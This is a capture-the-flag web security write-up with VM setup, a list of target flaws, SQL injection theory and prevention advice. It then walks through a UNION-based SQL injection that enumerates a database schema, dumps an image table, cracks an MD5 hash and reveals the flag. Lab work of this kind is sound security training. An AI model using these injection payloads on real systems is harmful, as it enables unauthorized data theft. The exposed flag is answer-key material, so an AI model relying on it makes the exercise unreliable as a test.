
A sort of capture the flag web application security project

Here is a website that gives a taster for hacking (web, networks, kernel):
https://www.bases-hacking.org/articles-categories.html


INSTALLATION

On Mac Osx Catalina, install VirtualBox 6.1.12 (released July 14 2020). Note: the latest version of VirtualBox crashes the VM.

New VM - Type : Linux - Version : (Oracle 32-bit)
New VM > settings > Network > Adapter 1 > Attached to: Bridged Adapter

To mount an iso the the VM:
New VM > settings > Storage > Under IDE Controller there should be an icon that shows a CD with a + sign on it...
click on the CD and then select your *.iso file

FOR EACH FAULT, NOTE: discovery, use (what it's used for), prevention, documentation

SQL_injection - search by ID
SQL_injection - search by image
page signin - brute force attack, SQL injection
hidden field - html vulnerability
URL Redirection - use a php vulnerability to load a different file
Cookies - find information in cookies
File upload field - force the upload of a file of any type
Header - crafting a http request with a specific header
XSS - two forms of xss vulnerabilities
javascript vulnerabilities



## SQL INJECTION

SQL injection is a type of injection attack. Injection attacks occur when maliciously crafted inputs are submitted by an attacker, causing an application to perform an unintended action.

use: 
A successful SQL injection attack can 
- read sensitive data from the database, 
- modify database data (insert/update/delete), 
- execute administration operations on the database (such as shutdown the DBMS), 
- recover the content of a given file existing on the DBMS file system or write files into the file system, 
- in some cases, issue commands to the operating system

prevention:
- You should always use parameterized statements where available, they are your number one protection against SQL injection.
- Here are some code samples in various languages:
https://www.hacksplaining.com/prevention/sql-injection#code-samples
- Principle of Least Privilege: applications should ensure that each process or software component can access and affect only the resources it needs. 
Apply “levels of clearance” as appropriate

## SQL IMAGE INJECTION

insert the following commands into the image search bar
- this is using POST, versus GET which is using the search bar of the browser

# To get the request columns number
1 OR 1=1 UNION SELECT NULL, NULL--
> 2 columns

# we type 1 OR 1=1 in the search field and we get all the result because every row
is considered true.

# To get the images columns names
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns

> id, url, title, comment

# Table structure :

Table name: list_images
column : id

Table name: list_images
column : url

Table name: list_images
column : title

Table name: list_images
column : comment

# To see all images's data
1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
> borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

# Finally "just use this md5 decode lowercase then sha256 to win this flag !"
md5_decrypt('1928e8083cf461a51303633093573c46')
> albatroz
lower('albatroz')
> albatroz
sh256('albatroz')
> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Flag == f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188